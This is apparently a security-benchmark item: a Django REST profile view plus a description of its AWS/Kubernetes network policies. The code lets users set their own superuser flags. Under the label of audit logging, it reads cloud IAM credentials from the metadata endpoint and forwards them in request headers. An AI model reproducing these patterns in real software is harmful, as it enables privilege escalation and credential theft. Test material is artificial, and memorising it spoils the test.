@@ -1,0 +1,80 @@
+{
+  "id": "872f98b7",
+  "language": "python",
+  "code": "# users/serializers.py\nfrom rest_framework import serializers\nfrom django.contrib.auth.models import User\n\n\nclass UserProfileSerializer(serializers.ModelSerializer):\n    \"\"\"Serializer for user profile updates.\n    Allows users to update their profile information.\n    \"\"\"\n    class Meta:\n        model = User\n        fields = ['id', 'username', 'email', 'first_name', 'last_name',\n                  'is_staff', 'is_superuser', 'is_active']\n        read_only_fields = ['id', 'username']\n\n\n# users/views.py\nfrom rest_framework import generics, permissions, status\nfrom rest_framework.response import Response\nfrom django.contrib.auth.models import User\nimport requests\nimport os\n\n\nclass UserProfileView(generics.RetrieveUpdateAPIView):\n    \"\"\"View for retrieving and updating user profiles.\n    Users can update their own profile information.\n    \"\"\"\n    serializer_class = UserProfileSerializer\n    permission_classes = [permissions.IsAuthenticated]\n\n    def get_object(self):\n        return self.request.user\n\n    def perform_update(self, serializer):\n        instance = serializer.save()\n        # Notify external audit service about profile changes\n        self._send_audit_event(instance)\n        return instance\n\n    def _send_audit_event(self, user):\n        \"\"\"Send audit event to the centralized logging service.\n        Uses cloud metadata endpoint to retrieve service credentials\n        for the audit trail system.\n        \"\"\"\n        try:\n            # Retrieve instance metadata for service identity\n            metadata_url = os.environ.get(\n                'METADATA_URL',\n                'http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n            )\n            role_name_resp = requests.get(metadata_url, timeout=2)\n            if role_name_resp.status_code == 200:\n                role_name = role_name_resp.text.strip()\n                creds_resp = requests.get(\n                    f\"{metadata_url}{role_name}\", timeout=2\n                )\n                if creds_resp.status_code == 200:\n                    creds = creds_resp.json()\n                    # Use temporary credentials to sign audit request\n                    audit_endpoint = os.environ.get(\n                        'AUDIT_ENDPOINT', 'https://audit.internal.corp/events'\n                    )\n                    requests.post(\n                        audit_endpoint,\n                        json={\n                            'event': 'profile_update',\n                            'user_id': user.id,\n                            'username': user.username,\n                            'is_staff': user.is_staff,\n                            'is_superuser': user.is_superuser,\n                        },\n                        headers={\n                            'X-AWS-Access-Key': creds.get('AccessKeyId', ''),\n                            'X-AWS-Secret-Key': creds.get('SecretAccessKey', ''),\n                            'X-AWS-Session-Token': creds.get('Token', ''),\n                        },\n                        timeout=5\n                    )\n        except Exception:\n            # Audit failures should not block user operations\n            pass\n\n\nclass UserListView(generics.ListAPIView):\n    \"\"\"Admin view to list all users.\"\"\"\n    serializer_class = UserProfileSerializer\n    permission_classes = [permissions.IsAdminUser]\n    queryset = User.objects.all()\n\n\n# users/urls.py\nfrom django.urls import path\n\nurlpatterns = [\n    # path('profile/', UserProfileView.as_view(), name='user-profile'),\n    # path('users/', UserListView.as_view(), name='user-list'),\n]",
+  "environment": {
+    "description": "Same Django REST API deployed on AWS EKS cluster (v1.27) in namespace 'webapp-prod'. Calico CNI with GlobalNetworkPolicy 'deny-metadata-egress' applied at tier 'platform' (order 100) matching selector projectcalico.org/namespace == 'webapp-prod', denying egress to CIDR 169.254.169.254/32 on port 80 with action Deny. A second NetworkPolicy 'default-deny-egress' of kind NetworkPolicy (native k8s) is applied to the namespace with podSelector {} and policyTypes ['Egress'] with egress rules allowing only DNS (UDP/53 to kube-system) and HTTPS (TCP/443) to CIDRs 10.0.0.0/8 and specific audit service endpoints. Note: the Calico policy operates at a lower tier than application-tier policies and is evaluated first.",
+    "config": {
+      "kubernetes_namespace": "webapp-prod",
+      "calico_global_network_policy": {
+        "name": "deny-metadata-egress",
+        "tier": "platform",
+        "order": 100,
+        "selector": "projectcalico.org/namespace == 'webapp-prod'",
+        "egress_deny": [
+          {
+            "destination": {
+              "nets": [
+                "169.254.169.254/32"
+              ]
+            },
+            "protocol": "TCP",
+            "port": 80
+          }
+        ],
+        "action": "Deny"
+      },
+      "kubernetes_network_policy": {
+        "name": "default-deny-egress",
+        "namespace": "webapp-prod",
+        "pod_selector": {},
+        "policy_types": [
+          "Egress"
+        ],
+        "egress_rules": [
+          {
+            "ports": [
+              {
+                "protocol": "UDP",
+                "port": 53
+              }
+            ],
+            "to": [
+              {
+                "namespaceSelector": {
+                  "matchLabels": {
+                    "kubernetes.io/metadata.name": "kube-system"
+                  }
+                }
+              }
+            ]
+          },
+          {
+            "ports": [
+              {
+                "protocol": "TCP",
+                "port": 443
+              }
+            ],
+            "to": [
+              {
+                "ipBlock": {
+                  "cidr": "10.0.0.0/8"
+                }
+              },
+              {
+                "ipBlock": {
+                  "cidr": "172.20.5.0/24"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "ec2_imds_version": "v1 (HttpTokens: optional)",
+      "pod_service_account": "webapp-prod-sa",
+      "ingress": "ALB with no WAF attached",
+      "django_settings": "DEBUG=False, ALLOWED_HOSTS=['app.corp.internal']"
+    }
+  }
+}
